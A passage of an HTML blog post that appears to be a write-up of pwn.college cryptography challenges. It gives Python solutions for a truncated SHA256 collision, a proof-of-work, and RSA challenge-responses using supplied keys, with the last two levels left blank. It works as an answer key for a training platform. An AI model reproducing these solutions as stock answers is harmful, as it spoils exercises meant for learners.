class="hljs-string">&quot;fwcvHfWZXTYBJXUc5Fa1qo/lgox68yZ4wnvG9PsqV2WFgKHrRxejnOKdoV8AFb4RxLGnHoYBXE/4AUsHmTIU0uffmnj4xxslpo0wwVOlXwnR7Z4mgejZnRtN2ZsfzKuWVCxnaKYbV9KCbfPe83TqqiWnnp8OwdS2UMWvAUds3G7gbyJK/JhbW5ezbk1iIK3qb5rKjYJpRtJ0fciF4EzxlzHeksAjYl19tuDQbnHO/e/A7DrTb6kJ3bdaBgCU9QqfqqzoJbzxwJMvWnQxCwCkMd5hvkTljJelLnUenJoLTMrO57+Qd1yXiMxK6eZ4R1Kzm79ZwWWRLPAdn/LjuLiXBA==&quot;</span><br><br>cipher = base64.b64decode(b64cipher)<br>c = bytes_to_long(cipher[::-<span class="hljs-number">1</span>])<br><br>n = p * q<br>phi = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>d = libnum.invmod(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>flag = long_to_bytes(m)[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h4 id="level9-3"><a href="#level9-3" class="headerlink" title="level9"></a>level9</h4><blockquote>
<p>Find a small hash collision using SHA256, considering only the first 2 bytes</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will hash data with a Secure Hash Algorithm (SHA256).<br>You will find a small hash collision.<br>Your goal is to find data, which when hashed, has the same hash as the secret.<br>Only the first 2 bytes of the SHA256 hash are considered.<br><br><br>secret sha256[:2] (b64): mMQ=<br>collision (b64):<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br>secret = base64.b64decode(<span class="hljs-string">&quot;mMQ=&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">256</span>):<br>            ans = <span class="hljs-built_in">bytes</span>([i, j, k])<br>            sha256_ans = sha256(ans).digest()<br>            <span class="hljs-keyword">if</span> sha256_ans[:<span class="hljs-number">2</span>] == secret[:<span class="hljs-number">2</span>]:<br>                <span class="hljs-built_in">print</span>(base64.b64encode(ans).decode())<br>                <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h4 id="level10-3"><a href="#level10-3" class="headerlink" title="level10"></a>level10</h4><blockquote>
<p>Compute a small proof-of-work by appending response data to the challenge data, resulting in a SHA256 hash with 2 null-bytes</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will hash data with a Secure Hash Algorithm (SHA256).<br>You will compute a small proof-of-work.<br>Your goal is to find response data, which when appended to the challenge data and hashed, begins with 2 null-bytes.<br><br><br>challenge (b64): P6Q7okZS0h5ckIDGB9SGOLuxd+ZBuIzWNTlToOQGYrU=<br>response (b64):<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> base64<br><br>challenge = base64.b64decode(<span class="hljs-string">&quot;P6Q7okZS0h5ckIDGB9SGOLuxd+ZBuIzWNTlToOQGYrU=&quot;</span>)<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> sha256(challenge + <span class="hljs-built_in">str</span>(i).encode()).digest()[:<span class="hljs-number">2</span>] == <span class="hljs-string">b&quot;\0\0&quot;</span>:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(base64.b64encode(<span class="hljs-built_in">str</span>(i).encode()))<br>        <span class="hljs-keyword">break</span><br>    i += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h4 id="level11-3"><a href="#level11-3" class="headerlink" title="level11"></a>level11</h4><blockquote>
<p>Complete an RSA challenge-response using provided public and private keys</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will complete an RSA challenge-response.<br>You will be provided with both the public key and private key.<br><br><br>e: 0x10001<br>d: 0x2a2d9ce51936251ddaabdd033214cb73750741c657dd57d5099c6fa0d53c6bb2c8db94871402ce97bd7959f15d15f30cfc018d13f146b0caebd40eb5db1d867b323d0291c0208cb5252f47ef2b4459d3a2ff91b4a2547c2c786e12eb6f679d08922b90e0d1057c7a5fe68cca785847f2f664fb8fb1fd8f314ed9aaecf78d525b1ffa0e6d175fd8e74729d94134c8a82f0dc7f1283a6d56e5894a99049eb4d0d5c1ee9758d59ff02db14cde859ffb832cc7cc64387c4178578f7e842f4928a21e7b40c99d4295ad512e579856a4b02d8380d88e56d7884280508b7a141999430bbb55eeed60f6d49fde7c552314308a42481c0dc453a1c790dd3a86660c0feb59<br>n: 0xe0c0a43e27a835de514134b43c876923ea537129449e9a09658b415d1f44da89ae14b7f959bad3128c1b0c0664056a2751f568356afadc362192dbe27b2b23f646110b1185087284212558138c97e30692e4c4a959617c5899950a605651cf96be8a65e006cab98a1260b8309042f239c9ec19a867046aa185e1308843521cb304516f324d48b2900903c4067e4f6fc37286d76f8a4a5d45f5bb1b3dd4afb1ae24bdbf46b52e31fc230d0ca12774538f1cbc9e3ff58a90878e103451278be8a88bd96de03bd083e16daaeafc35d6726b7084d0c6191744588579e3779f0d6eb2aaac97451239fd03c56f32d56706c1f67c000d0d050c068664a458a65af4d62f<br>challenge: 0xd0b3436468b8f3295c5fa753d49d58ce314bf3bab799deda1afb25e00936802518db9a902471e597391d0a19d2a80d7d32db15d7444c3cd601deecdf53400d6041e81086c13f07497765c4f122af8644c639491dbefa264f99d3efdb30bc722e775a3d6ccb462e872ef73d837f065328f7e954aed0fb1ae6db930c1bb82a04f3a68c75c9b26197142f17f0a82dbce181a86b4cacf5c96cbaf796167957562f66705fab010b2738929dd2be083a79cd03fb91cf8446356e6a94d92b8e5b873e6a0e3b6a99d604dc53e71d7501287c3a3d70fb0d6d9a6be45cbaef43b04e752537fa32f0d4eb82f5e6ce1e05e511025d7d5a63d1e170432cb6537acf7d30596af8<br>response:<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>e = <span class="hljs-number">0x10001</span><br>d = <span class="hljs-number">0x2a2d9ce51936251ddaabdd033214cb73750741c657dd57d5099c6fa0d53c6bb2c8db94871402ce97bd7959f15d15f30cfc018d13f146b0caebd40eb5db1d867b323d0291c0208cb5252f47ef2b4459d3a2ff91b4a2547c2c786e12eb6f679d08922b90e0d1057c7a5fe68cca785847f2f664fb8fb1fd8f314ed9aaecf78d525b1ffa0e6d175fd8e74729d94134c8a82f0dc7f1283a6d56e5894a99049eb4d0d5c1ee9758d59ff02db14cde859ffb832cc7cc64387c4178578f7e842f4928a21e7b40c99d4295ad512e579856a4b02d8380d88e56d7884280508b7a141999430bbb55eeed60f6d49fde7c552314308a42481c0dc453a1c790dd3a86660c0feb59</span><br>n = <span class="hljs-number">0xe0c0a43e27a835de514134b43c876923ea537129449e9a09658b415d1f44da89ae14b7f959bad3128c1b0c0664056a2751f568356afadc362192dbe27b2b23f646110b1185087284212558138c97e30692e4c4a959617c5899950a605651cf96be8a65e006cab98a1260b8309042f239c9ec19a867046aa185e1308843521cb304516f324d48b2900903c4067e4f6fc37286d76f8a4a5d45f5bb1b3dd4afb1ae24bdbf46b52e31fc230d0ca12774538f1cbc9e3ff58a90878e103451278be8a88bd96de03bd083e16daaeafc35d6726b7084d0c6191744588579e3779f0d6eb2aaac97451239fd03c56f32d56706c1f67c000d0d050c068664a458a65af4d62f</span><br>c = <span class="hljs-number">0xd0b3436468b8f3295c5fa753d49d58ce314bf3bab799deda1afb25e00936802518db9a902471e597391d0a19d2a80d7d32db15d7444c3cd601deecdf53400d6041e81086c13f07497765c4f122af8644c639491dbefa264f99d3efdb30bc722e775a3d6ccb462e872ef73d837f065328f7e954aed0fb1ae6db930c1bb82a04f3a68c75c9b26197142f17f0a82dbce181a86b4cacf5c96cbaf796167957562f66705fab010b2738929dd2be083a79cd03fb91cf8446356e6a94d92b8e5b873e6a0e3b6a99d604dc53e71d7501287c3a3d70fb0d6d9a6be45cbaef43b04e752537fa32f0d4eb82f5e6ce1e05e511025d7d5a63d1e170432cb6537acf7d30596af8</span><br><br>m = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">pow</span>(c,d,n))<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure>

<h4 id="level12-3"><a href="#level12-3" class="headerlink" title="level12"></a>level12</h4><blockquote>
<p>Complete an RSA challenge-response by providing the public key</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will complete an RSA challenge-response.<br>You will provide the public key.<br><br>e:<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">0x554f65ccb6cd9db91fceb4a32bd6173b09f9324de043cc9037c2c5e7fc2bb241556c0b75787a54bbc112006a66649144abdc570c87810dd7431e09ceaa6ffb680f3306d6355719419b1e59</span><br>p = <span class="hljs-number">0x84a7b001cfa7c6d9a3c200e02911dc8407b6f866b6274f2befed0ca37b45e80f1c50d25313d</span><br>q = <span class="hljs-number">0xa4a20d5fd52bff62c545f5e59bec13171d23f30377eee42e8e34af89e37fb2f70951fff7b4d</span><br>d = <span class="hljs-number">0xd4806263fd37519ac1d073c5c07c1a81c5e6279834faada4d0412c1921dcf6ba27be6b0cc2502e1353888f9c1c88d8027e9abb468de664629d0c6b32c0437040ce375cb2afbdb7fb90cf1</span><br><br>challenge = <span class="hljs-number">0x503bc7acf3ed48873eb4bcc536595ab8b9c1735623fc2a20ccbb996dfcc9b5267b4c35ca7ef1427f18fd51fdb36df4c3766ef7014a041165697e83634bbefdc6</span><br>response = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">pow</span>(challenge,d,n))<br><span class="hljs-comment"># print(response)</span><br><br>secret = <span class="hljs-string">b&quot;5armTxpBW9R088ISVKmp9xDOT67NLuOpbza/kW2BAIZfrjrluu15Xv3UyItjM3T8YVs/cbjYmUuxxzBLX3/hPwMegGGYlYxVfIdOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==&quot;</span><br>secret = base64.b64decode(secret)<br><br>c = <span class="hljs-built_in">int</span>.from_bytes(secret, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>flag =  m.to_bytes((m.bit_length() + <span class="hljs-number">7</span>) &gt;&gt; <span class="hljs-number">3</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h4 id="level13-3"><a href="#level13-3" class="headerlink" title="level13"></a>level13</h4><blockquote>
<p>Sign a user certificate using a provided self-signed root certificate and root private key</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">In this challenge you will work with public key certificates.<br>You will be provided with a self-signed root certificate.<br>You will also be provided with the root private key, and must use that to sign a user certificate.<br><br><br>root key d: 0x375eb69bcd972b471de0cfa0de19042475f267a252b5348a4733d3d3c4b0f1912c88a7bca3974a900bd7fb52bfbbb263f1cc68bf9efe5d32376dbf0577627ec078c086c7969601571c7e2f6d56f6af3b3a595e414e8628dc93aa739303c0bb17a50c8d6d488b14661454815a42c42e47d55044fe85a5e4185bb7cd4b892cbf61f0cf704e812bbf96cf86dc8e87d6f7f1884a7941e08b72869b09c88634242bbdadf767086c8e5157276c8ddcb1de9bdb3e3fe319fb5c94e9888b0679451978d1052560b120e3af96790da08c5bd0b4a641a442b0cee2de459dd763d2d09d4a14f586fdbf7dcce27a66474620da6e3bc37b0e5b03c4054b52634945118a9c601<br>root certificate (b64): eyJuYW1lIjogInJvb3QiLCAia2V5IjogeyJlIjogNjU1MzcsICJuIjogMjI1MzQ5OTA0NTk4MjI5ODEzNTk5NjE3Mjk5MjEyODY1MzA0MDcxODY3NzU2MjgyNDk1NTIxOTg1MjM3NTczNjgwOTAyMDcwMzMxMTIyOTQ2MzgxNDAyNTEyNzIwMTgwNTk4MzI1ODk3OTA0NjgxMDM2Mzc4Njg4MDY4NzAzMDU0OTY0NzQwODg0NDA2ODQxNTk0MjU4NDE4MjcxNDA1MDAwMTQxMjYzOTg4NDgyMjcyOTk5MTE4MTUxNTc5NTYyODY2MDM3MDczNzAxNTIwMDc0Njg4MDIzNDA3NjA0MTA1NDAwNDQ4MTM4NTI2NjM4NzY0MTAxNTk0OTc4NDg0MTg5NjMxMjk3MTA0MTY4NzQ5MzEyNjk5OTIyNjgyODA2ODg3Mjc0NTk1MzkwNzIxOTUyMzc5NDM1Mzk2NDgzMjc3MTc4MTkzNzEyNDQ0NDE4MjU3MDIwNDU1MTU0NjU3MDg1MTE0NDA4NTc0MDk5NTAxMzI2MDYxMjg2MzA1MzU4ODI5NDAzMTM5NDQ1ODU0NTE3NDk4ODUyNjUyNTY1NDIzNTA3OTgxNjI3NjE3OTk2MDEyNTE4OTY0NTMxNzY3OTMyNDkwODg5NDQ3NDQ5Mjg0Mzc1ODQzNTQzMjA1MTIxNTA2MjExNDkyODQ0NTI3NTQzNjkwMDE0NTM1NzgxMTk4ODY2NTAyODQ4Njk0ODM5MzU0NDQ0NzMxNTYxODE5OTc4Mjg0MjE1NTIyMjAwMjY4NTM4NzYwNjM0NDY4MDY3NzY1NDY2NTU1MTkyMDYxNDgwODE5MTEzMTkwMTU3MjMyODIzNTA4OTl9LCAic2lnbmVyIjogInJvb3QifQ==<br>root certificate signature (b64): hwsElNfFo99DurQ2y8BlPfwPf3kVk6EPNjQntqm1avvysj4/2nLvzISC0NilKnV7K9H8X56w/GpkR6lHTodnZn7veHL5IyP3Bt9Q7jkw5NYQVtZt1z41klY2S2xd4j4YcGcP8M5VNJQQHqFBLXvIIQIRBdKt3HRw0GfSQZhPGgYJ1rUdPY/UDRRNTlaSW9gNZVJm2qJ4jW+I0/WC3YkVg3eNOgaljU6pdvbfl5T0cyHuvD22fgECSaZYxhtOfZX6TS/SOCXf8FVIuMbA202xsgtaVbfjgIbubAXQjZPT09Il8+t4f9D8N/6yx9Iq9/nGuBqCmexqqmy8McEnzfBaSg==<br>user certificate (b64):<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>

<h4 id="level14-2"><a href="#level14-2" class="headerlink" title="level14"></a>level14</h4><blockquote>
<p>Perform a simplified TLS handshake as the server, completing a Diffie-Hellman key exchange and establishing an encrypted channel to provide a user certificate and prove private key ownership</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
      
        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
      
        <a href="/tags/WP/" class="print-no-link">#WP</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>pwn.college</div>
      <div>https://voidchunk.github.io/2024/09/01/pwn-college/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>voidchunk</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年9月1日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
                    <i class="iconfont icon-cc-nc"></i>
                  </span>
                </a>
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
                    <i class="iconfont icon-cc-sa"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/09/16/basectf2024-wp/" title="basectf2024 wp">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">basectf2024 wp</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/08/30/shellcode/" title="shellcode">
                        <span class="hidden-mobile">shellcode</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"SYjPmGSDkcEB2x6QugwZcAz6-gzGzoHsz","appKey":"BE7WE7EkMqAQRzWUhblFgR7H","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <script> var now = new Date(); function createtime() { var grt= new Date("05/12/2024 11:12:59");//此处修改你的建站时间或者网站上线时间 now.setTime(now.getTime()+250); days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} document.getElementById("timeDate").innerHTML = "voidchunk的小屋已经安全存在了 "+dnum+" 天 "; document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; } setInterval("createtime()",250); </script> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
